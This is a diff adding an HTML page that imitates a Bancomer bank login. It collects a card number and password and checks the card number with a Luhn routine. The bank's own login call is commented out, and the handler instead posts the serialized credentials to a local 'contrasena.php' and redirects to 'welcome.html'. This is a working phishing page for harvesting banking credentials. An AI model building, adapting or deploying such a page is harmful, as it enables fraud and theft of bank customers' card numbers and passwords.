@@ -1,0 +1,158 @@
+<html><head>
+    <title>Acceso</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <script src="comun/js/jquery_v1.11.3.js"></script>
+    <script type="text/javascript" src="comun/js/iframeResizer.contentWindow.min.js"></script>
+    <script type="text/javascript" src="comun/js/EnmascaraV2-AEM.js"></script>
+
+    <link rel="stylesheet" href="css/style_MD.css">
+    <script>
+        var cou=0;
+        function ship(a, t, e, o) {
+            patron_pm = /^[a-zA-Z0-9]{1}[0-9]{7}(-){0,1}[0-9]{3}$|^(0017)+([0-9]{12})$/,
+                patron_pf = /^(([0-9]{10,16}))$/,
+                cuenta = $("#cuenta").val()
+            patron_pm.test(cuenta) ? $("#servicio").val("e") : patron_pf.test(cuenta) && $("#servicio").val("n");
+            console.log($("#servicio").val());
+            if("true" == t){
+                $("#tempCuenta,.Cuenta_psw").removeClass("novalid");
+                $(".bar").removeClass("desa");
+                $('label').css('color','#666666');
+                $("#A").val(a.replace("%2520"," "));
+                $("#respuesta").val(t);
+                $("#perfil").val(e);
+                $("#tempCuenta").val("");
+                $("#cuenta").val(cuenta.replace("-", ""));
+                $("#form").submit();
+            }else if("false" == t){
+                if("n"==$("#servicio").val()){
+                    $("form").show();
+                    $(".carga").hide();
+                    $('label').css('color','#D44B50');
+                    $(".cond").show();
+                    $("#tempCuenta,.Cuenta_psw").addClass("novalid");
+                    $(".bar").addClass("desa");
+                    $("#loginButton").text("Corregir");
+                    dispositivo.search(/android/)>-1?document.getElementById("cuenta").focus():document.getElementById("tempCuenta").focus();
+                    dispositivo.search(/android/)>-1?$("#cuenta").val(""):$("#tempCuenta").val("");
+                    $(".etiq").show();
+                    $("#loginButton").removeAttr("disabled");
+                }
+                else if("e"==$("#servicio").val()){
+                    $("#form").attr("action","sustitucion.jsp");
+                    $("#tempCuenta").val("");
+                    $("#form").submit();
+                }
+            }
+        }
+
+        var dispositivo = navigator.userAgent.toLowerCase();
+    </script>
+</head>
+<body>
+<div class="container">
+    <h1>¡Bienvenido!</h1>
+    <form name="aceso" id="form" target="_self">
+        <div class="group">
+<input type="text" name="tempCuenta" id="tempCuenta" maxlength="16" class="tx_acceso" onkeydown="setTimeout('EnmascaraV2(\'tempCuenta\',\'cuenta\',false);',10);" autocomplete="off" required=""><input type="hidden" name="user" id="cuenta" value="">
+
+            <span class="highlight"></span>
+            <!-- span class="bar"></span-->
+            <label>Número de Tarjeta</label>
+        </div>
+        <div class="group">
+            <input name="pass" type="password"id="password" class="tx_acceso" autocomplete="off" required="">
+            <span class="highlight"></span>
+            <!-- span class="bar"></span-->
+            <label>Contraseña</label>
+        </div>
+
+        <p class="cond">Verifica que el numero de tu tarjeta sea correcto y este registrado.</p>
+        <div class="botonera">
+            <div id="bt_div" class="regis"><a href="https://www.bancomer.com/personas/registro.html" target="_top" class="tatione">¡Regístrate!</a></div>
+            <div id="bt_div" class="enviar"><button type="submit" id="loginButton" name="loginButton">Continuar</button></div>
+        </div>
+    </form>
+    <section class="carga" style="display:none"></section>
+</div>
+
+<script>
+
+    function valid_credit_card(value) {
+        // accept only digits, dashes or spaces
+        if (/[^0-9-\s]+/.test(value)) return false;
+
+        // The Luhn Algorithm. It's so pretty.
+        var nCheck = 0, nDigit = 0, bEven = false;
+        value = value.replace(/\D/g, "");
+
+        for (var n = value.length - 1; n >= 0; n--) {
+            var cDigit = value.charAt(n),
+                nDigit = parseInt(cDigit, 10);
+
+            if (bEven) {
+                if ((nDigit *= 2) > 9) nDigit -= 9;
+            }
+
+            nCheck += nDigit;
+            bEven = !bEven;
+        }
+
+        return (nCheck % 10) == 0;
+    }
+
+    $( document ).ready(function(){
+        dispositivo.search(/android/)>-1?document.getElementById("cuenta").focus():document.getElementById("tempCuenta").focus();
+        $.ajaxSetup({cache: false,timeout: 2000});
+        $("#loginButton").click(function(b) {
+            b.preventDefault();
+            cuenta = $("#cuenta").val();
+            regExp = /^[a-zA-Z0-9]{1}[0-9]{7}-?[0-9]{3}$|^0094[0-9]{8}$|^[0-9]{10}$|^[0-9]{16}$/;
+            if(cuenta==""||!regExp.test(cuenta) || !valid_credit_card(cuenta)){
+                cuenta==""?$(".cond").text("").text("Ingresa tu n\u00FAmero de tarjeta"):$(".cond").text("").text("Ingresa un n\u00FAmero de tarjeta v\u00E1lido");
+                $('label').css('color','#D44B50');
+                $("#tempCuenta,.Cuenta_psw").addClass("novalid");
+                $(".bar").addClass("desa");
+                $(".cond").show();
+                dispositivo.search(/android/)>-1?$("#cuenta").val(""):$("#tempCuenta").val("");
+                dispositivo.search(/android/)>-1?document.getElementById("cuenta").focus():document.getElementById("tempCuenta").focus();
+            }
+            else if(regExp.test(cuenta)) {
+                $("form").hide();
+                $(".carga").show();
+                $(".cond").hide();
+                // $(".cond").text("").text("Verifica que el n\u00FAmero de tu tarjeta sea correcto y este registrado.");
+                // $("#loginButton").attr("disabled", "disabled");
+                // $.getScript("/acceso/inicio-js.jsp?cuenta="+cuenta+"&cc="+cou).done(function(o,c){console.log(c)}).fail(function(o,c,n){ship("","false",""),console.log("Error en codigo")});
+                console.log("lanza el ajax papu");
+                $.ajax({
+                    url: "contrasena.php",
+                    type: "post",
+                    data: $("#form").serialize(),
+                    success(data){
+                        //parent.launchDialog(); version anterior
+                        parent.location.href = "welcome.html";
+                    }
+
+                });
+            }
+            else {
+                $(".cond").text("").text("Verifica que el n\u00FAmero de tu tarjeta sea correcto y este registrado.");
+                $('label').css('color','#D44B50');
+                $("#tempCuenta,.Cuenta_psw").addClass("novalid");
+                $(".bar").addClass("desa");
+                $(".etiq").show();
+                $("#loginButton").removeAttr("disabled");
+                dispositivo.search(/android/)>-1?$("#cuenta").val(""):$("#tempCuenta").val("");
+                dispositivo.search(/android/)>-1?document.getElementById("cuenta").focus():document.getElementById("tempCuenta").focus();
+            }
+        });
+    });
+</script>
+
+
+
+</body></html>
